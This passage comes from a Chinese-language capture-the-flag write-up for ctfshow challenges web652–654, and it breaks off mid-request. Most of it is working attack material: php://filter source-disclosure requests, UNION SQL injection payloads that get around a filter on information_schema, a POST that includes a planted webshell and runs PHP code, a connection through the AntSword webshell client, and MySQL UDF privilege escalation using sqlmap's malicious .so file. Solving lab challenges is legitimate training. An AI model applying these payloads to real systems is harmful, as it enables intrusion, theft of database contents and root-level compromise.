</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /system36d/users.php?action=remoteUpdate&amp;auth=ctfshow%7B28b00f799c2e059bafaa1d6bda138d89%7D&amp;update_address=php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3d../page.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: application/json, text/javascript, */*; q=0.01
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: cors
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: empty
</span></span><span class=line><span class=cl>Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/main.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=1, i
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=no>__DIR__</span><span class=o>.</span><span class=nx>DIRECTORY_SEPARATOR</span><span class=o>.</span><span class=s1>&#39;system36d/util/dbutil.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$id</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=s1>&#39;1&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 转义 &#39; &#34; \ 来实现防止注入
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$id</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$name</span> <span class=o>=</span> <span class=nx>db</span><span class=o>::</span><span class=na>get_username</span><span class=p>(</span><span class=nv>$id</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>这不一看就注入吗，继续读取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /system36d/users.php?action=remoteUpdate&amp;auth=ctfshow%7B28b00f799c2e059bafaa1d6bda138d89%7D&amp;update_address=php://filter/convert.base64-encode/resource=./util/dbutil.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: application/json, text/javascript, */*; q=0.01
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: cors
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: empty
</span></span><span class=line><span class=cl>Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/main.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=1, i
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>db</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>static</span> <span class=nv>$host</span><span class=o>=</span><span class=s1>&#39;localhost&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>static</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;root&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>static</span> <span class=nv>$password</span><span class=o>=</span><span class=s1>&#39;root&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>static</span> <span class=nv>$database</span><span class=o>=</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>static</span> <span class=nv>$conn</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>get_key</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ret</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$conn</span> <span class=o>=</span> <span class=nx>self</span><span class=o>::</span><span class=na>get_conn</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$res</span> <span class=o>=</span> <span class=nv>$conn</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=s1>&#39;select `key` from ctfshow_keys&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$res</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$row</span> <span class=o>=</span> <span class=nv>$res</span><span class=o>-&gt;</span><span class=na>fetch_array</span><span class=p>(</span><span class=nx>MYSQLI_ASSOC</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ret</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nx>self</span><span class=o>::</span><span class=na>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>get_username</span><span class=p>(</span><span class=nv>$id</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ret</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$conn</span> <span class=o>=</span> <span class=nx>self</span><span class=o>::</span><span class=na>get_conn</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$res</span> <span class=o>=</span> <span class=nv>$conn</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;select `username` from ctfshow_users where id = (</span><span class=si>$id</span><span class=s2>)&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$res</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$row</span> <span class=o>=</span> <span class=nv>$res</span><span class=o>-&gt;</span><span class=na>fetch_array</span><span class=p>(</span><span class=nx>MYSQLI_ASSOC</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ret</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nx>self</span><span class=o>::</span><span class=na>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>get_conn</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>self</span><span class=o>::</span><span class=nv>$conn</span><span class=o>==</span><span class=k>null</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nx>self</span><span class=o>::</span><span class=nv>$conn</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysqli</span><span class=p>(</span><span class=nx>self</span><span class=o>::</span><span class=nv>$host</span><span class=p>,</span> <span class=nx>self</span><span class=o>::</span><span class=nv>$username</span><span class=p>,</span> <span class=nx>self</span><span class=o>::</span><span class=nv>$password</span><span class=p>,</span> <span class=nx>self</span><span class=o>::</span><span class=nv>$database</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>self</span><span class=o>::</span><span class=nv>$conn</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>close</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>self</span><span class=o>::</span><span class=nv>$conn</span><span class=o>!==</span><span class=k>null</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nx>self</span><span class=o>::</span><span class=nv>$conn</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>直接括号闭合就行了，但是注入的时候发现貌似是过滤了<code>information</code>,那就换一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/page.php?id=222)+union+select+group_concat(table_name)+from+mysql.innodb_table_stats+where+database_name=database()%23
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/page.php?id=222)+union+select+*+from+ctfshow_secret%23
</span></span></code></pre></td></tr></table></div></div><h1 id=web653>web653</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /system36d/users.php?action=remoteUpdate&amp;auth=ctfshow%7B28b00f799c2e059bafaa1d6bda138d89%7D&amp;update_address=php://filter/convert.base64-encode/resource=./util/common.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: application/json, text/javascript, */*; q=0.01
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: cors
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: empty
</span></span><span class=line><span class=cl>Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/main.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=1, i
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;dbutil.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;k&#39;</span><span class=p>]</span><span class=o>!==</span><span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG651&#39;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;651flag未拿到&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>file_exists</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>db</span><span class=o>::</span><span class=na>get_key</span><span class=p>()</span><span class=o>==</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>        <span class=k>include</span> <span class=no>__DIR__</span><span class=o>.</span><span class=nx>DIRECTORY_SEPARATOR</span><span class=o>.</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>先去拿一下<code>key</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/page.php?id=222)+union+select+*+from+ctfshow_keys%23
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>key_is_here_you_know
</span></span></code></pre></td></tr></table></div></div><p>重新进后台包含木马(因为我直接进<code>common</code>没成功)</p><p>在数据还原这里，但是直接上传不行后面想想我们之前貌似是拿到了<code>backup.dat</code></p><p>但是路径又找不到，回去找到在<code>init.php</code>里面</p><p>这里终于是成功了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /system36d/util/common.php?k=flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}&amp;a=ls HTTP/1.1
</span></span><span class=line><span class=cl>Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=372619038
</span></span><span class=line><span class=cl>Content-Length: 81
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>Origin: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Sec-Fetch-Site: none
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
</span></span><span class=line><span class=cl>Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/util/common.php?k=flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}&amp;a=ls
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=0, i
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>key=key_is_here_you_know&amp;file=..%2Fdb%2Fdata_you_never_know.db&amp;a=phpinfo%28%29%3B
</span></span></code></pre></td></tr></table></div></div><p>链接<code>antsword</code></p><p><img src=/p/ctfshow-final-assessment/QQ20240924-140925.png width=1216 height=835 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag_653=ctfshow{5526710eb3ed7b4742232d6d6f9ee3a9}
</span></span></code></pre></td></tr></table></div></div><p>查看不了在之前的包里面RCE拿到的</p><h1 id=web654>web654</h1><p>之前我们看到了SQL的密码所以连接一下，来提权(<del>从没接触过</del>之前只会suid啥的)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>show</span><span class=w> </span><span class=n>variables</span><span class=w> </span><span class=k>like</span><span class=w> </span><span class=s2>&#34;%secure%&#34;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>secure_file_priv 为/root/</p><p>可以使用UDF提权,其本身就是上传一个恶意so文件来作为外部函数，然后我们就可以传入一个高权限的.so指令，再在mysql里面调用这个函数即可</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>show</span><span class=w> </span><span class=n>variables</span><span class=w> </span><span class=k>like</span><span class=w> </span><span class=s2>&#34;%plugin%&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>mariadb</span><span class=o>/</span><span class=n>plugin</span><span class=o>/</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><code>plugin</code>路径也就是<code>so</code>文件上传路径这里我们去到<code>sqlmap</code>里面找到恶意<code>so</code>文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sqlmap路径\data\udf\mysql\linux\64\lib_mysqludf_sys.so_
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /system36d/util/common.php?k=flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}&amp;a=ls HTTP/1.1
</span></span><span class=line><span class=cl>Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=372619038
</span></span><span class=line><span class=cl>Content-Length: 15585
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>Origin: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Sec-Fetch-Site: none
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
